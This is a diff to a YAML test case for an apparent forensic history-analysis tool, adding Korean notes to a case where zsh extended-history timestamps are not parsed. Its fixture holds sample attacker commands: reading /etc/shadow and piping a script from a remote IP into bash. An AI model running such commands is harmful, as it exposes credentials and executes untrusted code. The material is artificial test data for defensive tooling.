@@ -9,9 +9,12 @@ commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
 display: source-vs-result
 level: mcp
 realism: common
+realism_ko: "zsh 확장 기록 형식은 oh-my-zsh 기본값이라 흔하다."
 coverage: full
 summary: 'A zsh extended-history line ": 1775971800:0;cat /etc/shadow" (2026-04-12T05:30:00Z) is shown with Timestamp "—" and the raw prefix inside the command, and the file is counted as having 0 timestamped entries.'
 summary_ko: "zsh 확장 기록 줄 \": 1775971800:0;cat /etc/shadow\"(2026-04-12T05:30:00Z)가 Timestamp \"—\"로 표시되고 원래 접두어가 명령 안에 남으며, 파일은 타임스탬프 있는 항목 0개로 세어진다."
+defect_ko: "정상이라면 `: <epoch>:0;` 접두부에서 시각을 읽고 명령만 보여야 하는데, 이 서버는 접두부째 명령으로 두고 시각을 비운다. 그래서 모델은 이 명령들이 언제 실행됐는지 알 수 없다고 잘못 안다."
+setup_ko: "zsh 확장 형식 줄 두 개가 든 `.zsh_history`를 넣었다."
 fixture:
   - path: fs/home/alice/.zsh_history
     text: |
@@ -19,12 +22,16 @@ fixture:
       : 1775971805:0;curl -s http://203.0.113.7/x.sh | bash
 steps:
   - tool: analyze_bash_history
+    note_ko: "결함이 있는 호출: zsh 기록 분석"
     args:
       path: ${EVIDENCE}/fs/home/alice/.zsh_history
 expect:
   - step: 1
+    note_ko: "타임스탬프 있는 항목이 0개로 나온다"
     contains: "**Timestamped:** 0"
   - step: 1
+    note_ko: "첫 명령의 시각이 `—`이고 접두부가 명령 안에 남는다"
     contains: "| 1 | — | `: 1775971800:0;cat /etc/shadow` |"
   - step: 1
+    note_ko: "실제 시각 2026-04-12T05:30:00이 응답 어디에도 없다"
     not_contains: "2026-04-12T05:30:00"
